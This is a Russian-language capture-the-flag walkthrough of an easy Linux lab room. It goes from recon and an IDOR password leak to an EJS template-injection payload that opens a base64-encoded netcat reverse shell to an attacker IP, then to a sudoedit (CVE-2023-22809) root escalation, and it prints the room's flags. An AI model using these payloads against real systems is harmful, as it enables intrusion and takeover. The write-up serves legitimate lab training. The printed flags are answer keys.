**Слодность:** Easy  
**Теги:** Linux, boot2root  
## 1. Подготовка окружения
Добавляем домен в `/etc/hosts`:

```bash
sudo echo "10.114.163.193 cyprusbank.thm" | sudo tee -a /etc/hosts
```

## 2. Сбор информации

### Nmap
```bash
sudo nmap -sC -sS -sV 10.114.163.193
```

**Результат:**
```bash
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
```

### Nuclei
```bash
nuclei -u 10.114.163.193 -severity low,medium,high,critical
```

**Результат:** обнаружен CVE-2023-48795 (Terrapin attack) на порту 22.

## 3. Сбор доменов

### ffuf
```bash
ffuf -u http://10.114.163.193/FUZZ -w ~/HH101/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

### gobuster
```bash
gobuster dir -u http://10.114.163.193/ -w ~/HH101/seclists/Discovery/Web-Content/big.txt
```

**Результат:** найден `/index.html` (200).

### Дополнительно (для субдоменов)
```bash
ffuf -u 'http://cyprusbank.thm/' -H "Host: FUZZ.cyprusbank.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -t 100 -ic -fw 1
```

**Результат:** находим `admin.cyprusbank.thm`.

## 4. Доступ к admin-сайту
Заходим на http://admin.cyprusbank.thm с данными, которые выдали в начале комнаты:
- **Username:** `Olivia Cortez`
- **Password:** `olivi8`

## 5. IDOR + кража пароля

Перебираем параметр `c=` в разделе **Сообщения**:
```bash
https://admin.cyprusbank.thm/messages/?c=10
```

Находим чат с IDOR. Читаем историю сообщений:
```
DEV TEAM: Thanks Gayle, can you share your credentials? We need privileged admin account for testing
Gayle Bev: Of course! My password is 'p~]P@5!6;rs558:q'
```

**Крадём пароль** `p~]P@5!6;rs558:q` от Gayle Bev.

## 6. Поиск телефона и флагов

В базе данных находим запись:
```
Name            Balance            Phone
Tyrell Wellick  $20.855.900.000    842-029-5701
```

## 7. Получение shell как web (SSTI через EJS)

В разделе Settings находим возможность смены пароля пользователя.

При изменении пароля мы видим отражение данных (XSS/SSTI).
Ключевой запрос (с параметром outputFunctionName):
```
httpname=a&password=b&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('bash -c "echo YnVzeWJveCBuYyAxMC4xNC45MC4yMzUgNDQ0NSAtZSAvYmluL2Jhc2g= | base64 -d | bash"');//
```
Настраиваем listener на порту 4445 (или любой удобный) и отправляем payload.
Получаем reverse shell как пользователь web.

Улучшаем shell (для интерактивности).
В домашней директории пользователя web находим user flag.

**User flag:**
```bash
THM{4lways_upd4te_uR_d3p3nd3nc!3s}
```
## 8. Privilege Escalation (sudoedit + CVE-2023-22809)
Выполняем
```bash
web@cyprusbank:~$ sudo -l
```

Видим:
```
BashMatching Defaults entries for web on cyprusbank:
    ...
User web may run the following commands on cyprusbank:
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```
**CVE-2023-22809 (sudoedit bypass**) — уязвимость позволяет использовать переменную окружения EDITOR для чтения и редактирования любых файлов без ограничений.
```bash
export EDITOR="vi -- /root/root.txt"
sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```
**Root flag:**
```bash
THM{4nd_uR_p4ck4g3s}
```
